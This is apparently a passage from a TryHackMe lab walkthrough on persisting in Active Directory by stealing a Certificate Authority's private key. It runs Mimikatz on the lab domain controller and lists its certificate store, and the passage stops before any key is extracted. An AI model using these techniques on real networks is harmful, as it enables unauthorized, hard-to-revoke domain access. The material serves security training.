
## AD CS
Certificates can grant us Domain Admin privileges, but they’re also a powerful tool for persistence. Here’s how it works:
- **What we need**: A valid certificate that supports Client Authentication.
- **Why it’s useful**: With this certificate, we can request a Ticket Granting Ticket (TGT) at any time.
- **The advantage**: Even if the targeted account’s password changes, we can still generate TGTs.
- **Persistence**: The only way to stop us is to revoke the certificate or wait for it to expire—usually about 5 years!

If we want ultimate persistence, we can go after the Certificate Authority (CA) itself. Here's how and why this is devastating:
- **Stealing the Root CA's Private Key**: If we steal the CA's private key, we can create our own certificates at will.
- **No Revocation**: Certificates we create won’t be issued by the CA, so the blue team cannot revoke them.
- **Impact on the Blue Team**: To remove us, they would need to rotate the entire CA, which requires revoking every single certificate it issued—disrupting the entire domain.
- **Why It’s Worse**: Imagine the blue team resets all credentials, removes Golden and Silver Tickets, and thinks the attackers are gone—only to discover we persisted as the CA itself.

## Extracting the Private Key
The private key of the Certificate Authority (CA) is stored on the CA server. In many organizations, especially those using Active Directory Certificate Services (AD CS) internally, this key isn’t always protected by advanced hardware methods like a Hardware Security Module (HSM). Instead, it is usually protected by the server's Data Protection API (DPAPI). This makes it possible for attackers to use tools like Mimikatz or SharpDPAPI to extract the CA's certificate and private key. With the private key, attackers can control the CA and create their own certificates, which can break the security of the whole network.


Use SSH to authenticate to THMDC.za.tryhackme.loc using the Administrator credentials from Task 2, create a unique directory for your user, move to it, and load Mimikatz:
```shell-session
za\administrator@DC C:\Users\Administrator.ZA>mkdir <username> 
za\administrator@DC C:\Users\Administrator.ZA>cd <username>
za\administrator@DC C:\Users\Administrator.ZA\am0>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz #
```

Let's first see if we can view the certificates stored on the DC:
```shell-session

mimikatz # crypto::certificates /systemstore:local_machine
 * System Store  : 'local_machine' (0x00020000)
 * Store         : 'My'

 0.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 040000000000703a4d78090a0ab10400000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
[....]
```